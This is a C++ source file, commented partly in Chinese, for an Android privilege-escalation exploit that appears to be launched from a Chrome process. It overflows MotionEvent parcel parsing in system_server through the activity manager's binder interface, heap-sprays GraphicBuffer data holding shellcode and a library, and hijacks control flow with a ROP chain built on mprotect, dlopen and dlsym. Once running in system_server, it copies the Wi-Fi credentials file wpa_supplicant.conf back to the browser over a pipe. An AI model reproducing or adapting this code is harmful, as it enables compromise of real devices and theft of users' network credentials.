#include <binder/Parcel.h>
#include <binder/ProcessState.h>
#include <binder/IServiceManager.h>
#include <binder/TextOutput.h>
#include <cutils/ashmem.h>
#include<android/log.h>
#define private public
#include <input/KeyCharacterMap.h>
#include <dlfcn.h>
#include <unistd.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <android_runtime/AndroidRuntime.h>
#include "jni.h"


using namespace android;
static void log2js(const char *fmt,...);
static bool in_system_server = false;
#define HEAPSPRAY 0
#define HEAPCORRUPT 1
#define HEAPSPRAY2 2
#define GC 3
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR  , "exploit", __VA_ARGS__);\
                  if(!in_system_server)log2js(__VA_ARGS__)
//#define EXE 0
#ifdef EXE
    #define dprint printf
#else
    #define dprint LOGE
#endif

static int do_work(int port_number);
static void writeParcelableHead(Parcel *pData,const char *class_name);
/*status_t MotionEvent::writeToParcel(Parcel* parcel) const {
 *     size_t pointerCount = mPointerProperties.size();
 *     size_t sampleCount = mSampleEventTimes.size();
 * 
 *     parcel->writeInt32(pointerCount);
 *     parcel->writeInt32(sampleCount);
 * 
 *     parcel->writeInt32(mDeviceId);
 *     parcel->writeInt32(mSource);
 *     parcel->writeInt32(mAction);
 *     parcel->writeInt32(mFlags);
 *     parcel->writeInt32(mEdgeFlags);
 *     parcel->writeInt32(mMetaState);
 *     parcel->writeInt32(mButtonState);
 *     parcel->writeFloat(mXOffset);
 *     parcel->writeFloat(mYOffset);
 *     parcel->writeFloat(mXPrecision);
 *     parcel->writeFloat(mYPrecision);
 *     parcel->writeInt64(mDownTime);
 * 
 *     for (size_t i = 0; i < pointerCount; i++) {
 *         const PointerProperties& properties = mPointerProperties.itemAt(i);
 *         parcel->writeInt32(properties.id);
 *         parcel->writeInt32(properties.toolType);
 *     }
 * 
 *     const PointerCoords* pc = mSamplePointerCoords.array();
 *     for (size_t h = 0; h < sampleCount; h++) {
 *         parcel->writeInt64(mSampleEventTimes.itemAt(h));
 *         for (size_t i = 0; i < pointerCount; i++) {
 *             status_t status = (pc++)->writeToParcel(parcel);
 *             if (status) {
 *                 return status;
 *             }
 *         }
 *     }
 *     return OK;
 * }*/

/*status_t PointerCoords::writeToParcel(Parcel* parcel) const {
 *     parcel->writeInt64(bits);
 * 
 *     uint32_t count = BitSet64::count(bits);
 *     for (uint32_t i = 0; i < count; i++) {
 *         parcel->writeFloat(values[i]);
 *     }
 *     return OK;
 * }
 */
static const uint32_t g_fixedAddress = 0x9010100c;
static void writeMotionEvent(Parcel *pData,int overwriteLen,int type){
    /*3208    public void writeToParcel(Parcel out, int flags) {
     * 3209        out.writeInt(PARCEL_TOKEN_MOTION_EVENT);
     * 3210        nativeWriteToParcel(mNativePtr, out);
     * 3211    }
     */
    pData->writeInt32(-1);// token MotionEvent createFromParcel
    size_t pointerCount = 1;
    size_t sampleCount = overwriteLen;//决定写的长度

    pData->writeInt32(pointerCount);
    //sizeof(PointerCoords) == 128
    if(type==HEAPSPRAY)
        //pData->writeInt32((0x1d97c000-16)/128);//allocate large memory in system_server
        pData->writeInt32((0x17000000-16)/128);//allocate large memory in system_server
    else
        pData->writeInt32(0x1ffffffe);//overflow 0x1ffffffe*8+16,分配的大小为8

    pData->writeInt32(1);
    pData->writeInt32(1);
    pData->writeInt32(1);
    pData->writeInt32(1);
    pData->writeInt32(1);
    pData->writeInt32(1);
    pData->writeInt32(1);
    pData->writeFloat(1.1);
    pData->writeFloat(1.1);
    pData->writeFloat(1.1);
    pData->writeFloat(1.1);
    pData->writeInt64(1);

    for (size_t i = 0; i < pointerCount; i++) {
        pData->writeInt32(1);
        pData->writeInt32(1);
    }

    //堆破坏时写相邻堆块的值,覆盖一个NativeKeyCharacterMap structure
    //uint64_t weakref_impl_point = (((uint64_t)(g_fixedAddress+0x18))<<32) + g_fixedAddress+0x18;
    uint64_t weakref_impl_point = (((uint64_t)(g_fixedAddress))<<32) + g_fixedAddress;
    for (size_t h = 0; h < sampleCount-1; h++) {
        //dprint("writing content is %llx\n",weakref_impl_point);
        pData->writeInt64(weakref_impl_point);
        for (size_t i = 0; i < pointerCount; i++) {
            //write PointerCorrds
                uint64_t bitsets = 0;
                uint32_t count = 0;
            if(type==HEAPSPRAY){
                bitsets = 0x3fffffff;
                count = 30;
            }
            pData->writeInt64(bitsets);
            for (uint32_t i = 0; i < count; i++) {
                //在固定地址0x59500018写的值，构造一个weakref_impl
                /*(gdb) pt /m refs
                 * type = class android::RefBase::weakref_impl : public android::RefBase::weakref_type {
                 *   public:
                 *       volatile int32_t mStrong;
                 *       volatile int32_t mWeak;
                 *       android::RefBase * const mBase;
                 *       volatile int32_t mFlags;
                 *} * const
                 */
                //0x59500000处的内存layout
                //0000000: 01000000 80db4111 00000000 00000000  ......A.........
                //0000010: ffffff3f 00000000 00000000 01000000  ...?............
                //0000020: 02000000 03000000 04000000 05000000  ................
                //0000030: 06000000 07000000 08000000 09000000  ................
                //0000040: 0d0a0000 000b0000 000c0000 000d0000  ................
                //0x0-0xf为SharedBuffer头，
                //0x10-0x17 bitsets
                //0x18,+30*4 为写的浮点值
                if(i==0){//control refcount
                    uint32_t mStrong = 1;
                    pData->writeFloat(*(float*)&mStrong);
                }else if(i==2){//mBase address 0x59500000+0x20
                    uint32_t mBase_address = g_fixedAddress+0x30+128;//128下一个PointCordinate
                    pData->writeFloat(*(float*)&mBase_address);
                }else if(i==6){
                    uint32_t pvtable = g_fixedAddress+0x34+128;
                    pData->writeFloat(*(float*)&pvtable);
                }else if(i==0xa){//onLastStrongRef in vtable
                    uint32_t controlled_ip = 0xdeadbeaf;
                    pData->writeFloat(*(float*)&controlled_ip);
                }else{
                    pData->writeFloat(*(float*)&i);
                }
            }
        }
    }

    //最后一个非法的BitSet提前结束拷贝
    if(type==HEAPCORRUPT){
        pData->writeInt64(weakref_impl_point);
        pData->writeInt64(0xffffffffffffffffL);//BitSet全为1是非法的
    }
}

static void writeKeyCharacterMap(Parcel *pData){
    //parcel->writeInt32(map->getDeviceId());
    pData->writeInt32(0x12345678);
    pData->writeInt32(0);
    pData->writeInt32(0);
}
static void writeCursorWindow(Parcel *pData,int fd_ashmem){
    //dest.writeInt(mStartPos);
    pData->writeInt32(12);
    pData->writeString8(String8("cursorname"));
    pData->writeDupFileDescriptor(fd_ashmem);
    //pData->writeFileDescriptor(fd_ashmem);
}

static void writePackageOps(Parcel *pData){
    /*int buffer[0x5000];
    for(int i=0;i<0x5000;i++)
        buffer[i]=rand()%0xcccccccc;
    pData->write(buffer,0x5000*4);*/
    pData->writeString16(String16("a"));
    pData->writeInt32(1);//uid
    pData->writeInt32(0x80000);
}

//libandroid_runtime.so
//r4会指向weakref_impl,r3指向vptr
//0x00075cba : mov r7, r0 ; mov r0, r2 ; ldr r1, [sp, #0x30] ; add r2, sp, #0x14 ; ldr r4, [r3, #8] ; blx r4
//0x0f 0x46 0x11 0x46 0x16 0x46 0x05 0x46 0x63 0x6d 0x98 0x47
//0x00060708 : mov sp, r7 ; pop {r4, r5, r6, r7, pc}//0xbd 0x46 0xf0 0xbd这句会执行两次,第一次pc的位置已经被占有
//0x000811ca : ldr lr, [sp], #4 ; add sp, #8 ; bx lr//assign value to lr, run two times
//0x000819f0 : pop {r0, r1, r2, r3, r4, r7, pc} //0x9f 0xbd call system call
static uint32_t libruntime_base = 0;
static uint32_t mprotect_p = 0;
static uint32_t dlopen_p = 0;
static uint32_t dlsym_p = 0;
static uint32_t shellcode_p = 0;
static uint32_t shellcode_len = 0;
static uint32_t so_p = 0;
static uint32_t so_len = 0;
static int pipefd[2]={0,0};
static ino_t pipe_ino = 0;
static void writeGraphicBuffer(Parcel *pData,uint32_t len){
    //in createFromParcel in java
    int fds=0;
    static uint32_t called_count =0;
    if(called_count==0) fds=1;
    for(int i=0;i<4;i++) pData->writeInt32(0x12345678);
    if(called_count==0)
        pData->writeInt32(4*(len+10));//len or 0xffffffff
    else
        pData->writeInt32(0xffffffff);//len or 0xffffffff
    pData->writeInt32(fds);//fd_count
    pData->writeInt32('GBFR');//magic
    for(int i=0;i<7;i++)
        pData->writeInt32(0xdeaddead);
    pData->writeInt32(fds);//numFds
    pData->writeInt32(len);//numInts

    //前64M为so内容
    if(called_count<4*1024&&called_count>0){
        pData->write((void*)so_p,so_len);
        called_count++;
        return;
    }
    
    //写shellcode内容
    static uint32_t ropgadget1=libruntime_base+0x75cba+1;
    static uint32_t ropgadget2=libruntime_base+0x60708+1;
    static uint32_t ropgadget3=libruntime_base+0x811ca+1;
    static uint32_t ropgadget4=libruntime_base+0x819f0+1;

    uint32_t vptr[]={1,2,ropgadget2,ropgadget1};
    //_vptr,mRefs
    uint32_t refBase[2]={g_fixedAddress+sizeof(refBase), g_fixedAddress+sizeof(vptr)+sizeof(refBase)};
    //mStrong,mWeak,mBase,mFlags
    uint32_t weakref_impl[4]={1,1,g_fixedAddress,0};
    uint32_t total_struct_size = sizeof(vptr)+sizeof(weakref_impl)+sizeof(refBase);
    uint32_t stack_base = g_fixedAddress+total_struct_size;
    vptr[1]=stack_base;
    //mprotect是arm指令
    //stack的最后4个字为shellcode地址,dlopen,dlsym,so
    uint32_t stack[]={4,5,6,7,ropgadget3,ropgadget3,0xdead,0xdead,ropgadget4,0xdead,0xdead
    ,g_fixedAddress&0xfffff000,0x1000,7,3,4,7,mprotect_p,0,1,2,3,4,7,0xfeed,dlopen_p,dlsym_p,0xffffffff,pipe_ino};
    uint32_t n = sizeof(stack)/sizeof(stack[0]);
    //修改shellcode stub,设置参数
    *(int*)(shellcode_p+12)=stack_base+sizeof(stack)-16;//r0 buffer
    //设置要跳到的shellcode位置,指向数组[dlopen,dlsym]的指针
    stack[n-5]=stack_base+sizeof(stack);//执行shellcode
    //must be multiples of 4

    for(uint32_t i=0;i<len;){
        if(i%1024==0){//第一个页的前3个dword已经被native_handle占用
            pData->write(refBase,sizeof(refBase));
            pData->write(vptr,sizeof(vptr));
            pData->write(weakref_impl,sizeof(weakref_impl));
            pData->write(stack,sizeof(stack));
            i+=(total_struct_size+sizeof(stack))/4;
            pData->write((void*)shellcode_p,shellcode_len);
            i+=shellcode_len/4;
        }else{
            pData->writeInt32(i%1024);
            i++;
        }
    }
    if(called_count==0) pData->writeDupFileDescriptor(pipefd[1]);
    called_count++;
}

static void writeParcelableHead(Parcel *pData,const char *class_name){

    //write key
    static int count = 1;
    char buffer[16]={0};
    snprintf(buffer,16,"%d",count);
    pData->writeString16(String16((const char *)buffer));
    count ++;
    //wirte value
    //1267            writeInt(VAL_PARCELABLE);
    //1268            writeParcelable((Parcelable) v, 0);
    const int VAL_PARCELABLE = 4; 
    pData->writeInt32(VAL_PARCELABLE);
    pData->writeString16(String16(class_name));
}

static void writeBundle(Parcel *pData,int type){
    size_t lengthPos = pData->dataPosition();
    pData->writeInt32(0xfffff);
    const int BUNDLE_MAGIC = 0x4C444E42; 
    pData->writeInt32(BUNDLE_MAGIC);
    size_t startPos = pData->dataPosition();

    if(type==GC){
        pData->writeInt32(1);
        writeParcelableHead(pData,"android.app.AppOpsManager$PackageOps");
        writePackageOps(pData);
    }else if(type==HEAPCORRUPT||type==HEAPSPRAY){
        int numKeyCharacterMap = 0;
        int numCursorWindow = 0;
        if(type==HEAPCORRUPT)
            numKeyCharacterMap=400;
        pData->writeInt32(numKeyCharacterMap+numCursorWindow*2+1);//from writeArrayMapInternal,object numbers in bundle
        /*int fd_ashmem = ashmem_create_region("xxxxxxxx", 0x10000000);
        dprint("fd is %d\n",fd_ashmem);
        for(int j=0;j<numCursorWindow;j++){
            writeParcelableHead(pData,"android.database.CursorWindow");
            writeCursorWindow(pData,fd_ashmem);
        }*/
        for(int i=0;i<numKeyCharacterMap;i++){
            writeParcelableHead(pData,"android.view.KeyCharacterMap");
            writeKeyCharacterMap(pData);
        }
        writeParcelableHead(pData,"android.view.MotionEvent");
        writeMotionEvent(pData,1,type);

    }else if(type==HEAPSPRAY2){
        int count = 1;
        pData->writeInt32(count);
        for(int i=0;i<count;i++){
            writeParcelableHead(pData,"android.view.GraphicBuffer");
            writeGraphicBuffer(pData,4000);
        }
    }else{
        exit(0);
    }

    size_t endPos = pData->dataPosition();
    // Backpatch length
    pData->setDataPosition(lengthPos);
    int length = endPos - startPos;
    pData->writeInt32(length);
    pData->setDataPosition(endPos);
}

static void transact(sp<IBinder> &service,int type){

    Parcel data, reply;
    data.writeInterfaceToken(String16("android.app.IActivityManager"));
    data.writeStrongBinder(service);
    data.writeInt32(333);
    writeBundle(&data,type);
    const int CONVERT_TO_TRANSLUCENT_TRANSACTION = 175;
    service->transact(CONVERT_TO_TRANSLUCENT_TRANSACTION, data, &reply);

}
static bool g_escalate_succ = false;
static uint32_t write2jsbuffer = 0;
#ifndef EXE
static int tmain
#else
int main
#endif
(__attribute__((unused)) int argc, __attribute__((unused)) char* const argv[])
{
    void *handle = dlopen("libandroid_runtime.so",RTLD_NOW);
    libruntime_base = *(int*)((int)handle+140);
    dlclose(handle);
    mprotect_p = (uint32_t)dlsym((void*)0xffffffff,"mprotect");
    dlopen_p = (uint32_t)dlsym((void*)0xffffffff,"dlopen");
    dlsym_p = (uint32_t)dlsym((void*)0xffffffff,"dlsym");
    dprint("%p,%x,%x,%x\n",handle,mprotect_p,dlopen_p,dlsym_p);
#ifdef EXE
    libruntime_base = 0xb6ebc000;
    mprotect_p = 0xb6e16000 + 0x3a25c;
#endif
    sp<IServiceManager> sm = defaultServiceManager();
    sp<IBinder> service = sm->checkService(String16("activity"));
    if (service != NULL ) {
        dprint("begin spray\n");
        for(int i=0;i<1024*12;i++)//喷256M(1024*16),前64M为so的内容
            transact(service,HEAPSPRAY2);//一次4000*4字节
        dprint("end spray\n");
        for(int i=0;i<200;i++){
            transact(service,HEAPCORRUPT);
            //transact(service,GC);
            if(read(pipefd[0],(void*)write2jsbuffer,1000)>0) break;
            //sleep(1);
            //dprint("time %d\n",i);
            //fflush(stdout);//编译成so时得注掉
            //if((i+1)%35==0)
            //transact(service,GC);
        }
    }else{
        dprint("get activitymanger failed\n");
        LOGE("fuck");
    }
    //gc();
    dprint("done\n");
    return 0;
}
static int OSCopyFile(const char* source, int output)
{    
    int input;    
    if ((input = open(source, O_RDONLY)) == -1)
    {
        dprint("open %s fail\n",source);
        return -1;
    }    

    off_t bytesCopied = 0;
    struct stat fileinfo;
    fstat(input, &fileinfo);
    dprint("file size %lld",fileinfo.st_size);
//    int result = sendfile(output, input, &bytesCopied, fileinfo.st_size);
    int result = splice(input,NULL,output,NULL,fileinfo.st_size,0);
    if(result==-1)
        dprint("%s",strerror(errno));
    dprint("send %d bytes to pipe",result);

    close(input);
    return result;
}

static void *escape_priviledge(void *args){
    uint32_t *p = (uint32_t*)args;
    shellcode_p=p[0];
    shellcode_len=p[1];
    so_p = p[2];
    so_len = p[3];
    uint32_t array_buffer_address = so_p-0x1000;
    write2jsbuffer = array_buffer_address+128;
    dprint("shellcode is at %x,len is %d\n",shellcode_p,shellcode_len);
    dprint("so at %x,len is %d\n",so_p,so_len);
    //pipe is used to communicate chrome with system_server
    if(pipe2(pipefd,O_NONBLOCK)==-1)dprint("create pipe failed %s\n",strerror(errno));
    struct stat sb;
    fstat(pipefd[1],&sb);
    pipe_ino = sb.st_ino;
    dprint("pipe inode is %ld\n",pipe_ino);
    tmain(1,NULL);
    dprint("escalate thread exit\n");
    return NULL;
}
//FinalizerWatchdogDaemon
static void disable_watchdog(){
    JNIEnv* env = android::AndroidRuntime::getJNIEnv();

    //void *env = dlsym((void*)0xffffffff,"_ZN7android14AndroidRuntime9getJNIEnvEv");
    jclass clazz = env->FindClass("java/lang/Daemons$FinalizerDaemon");
    //jmethodID methodId;
    jfieldID field = env->GetStaticFieldID(clazz,"INSTANCE","Ljava/lang/Daemons$FinalizerDaemon;");
    jobject instance = env->GetStaticObjectField(clazz,field);
    jfieldID object = env->GetFieldID(clazz,"finalizingObject","Ljava/lang/Object;");
    dprint("jni clazz %p,instance %p,object %p\n",clazz,instance,object);
    //env->CallVoidMethod(instance,stop);
    env->SetObjectField(instance,object, 0);
//
}

#ifndef EXE
extern "C" void so_main(uint32_t* buffer){
    if(buffer[0]==0xffffffff){
        in_system_server = true;
        dprint("in system_server so\n");
        ino_t pipe_inode = (ino_t)buffer[1];
        //find the pipe's fd
        struct stat sb;
        int fd = 0;
        for(fd=0;fd<2000;fd++){
            int ret = fstat(fd,&sb);
            if( ret==0&&pipe_inode == sb.st_ino){
                dprint("find pipe's fd is %d\n",fd);
                break;
            }
        }
        if(fd==2000)dprint("find pipe's fd fail\n");
        //OSCopyFile("/data/misc/wifi/wpa_supplicant",fd);
        OSCopyFile("/data/misc/wifi/wpa_supplicant.conf",fd);
        //disable_watchdog();
        sleep(15000);
        *(int*)0=0;
    }else{
        //创建一个新线程来提权，这样chrome可以刷新
        dprint("in chrome process so\n");
        pthread_t t;
        pthread_create(&t,NULL,escape_priviledge,buffer);
    }
}

#endif
static void log2js(const char* fmt, ...) {
    va_list ap;
    //char buf[4096]={0};
    va_start(ap, fmt);
    if(write2jsbuffer!=0){
        int n=vsnprintf((char*)write2jsbuffer, 2000, fmt, ap);
        write2jsbuffer+=n;
    }
    va_end(ap);
}
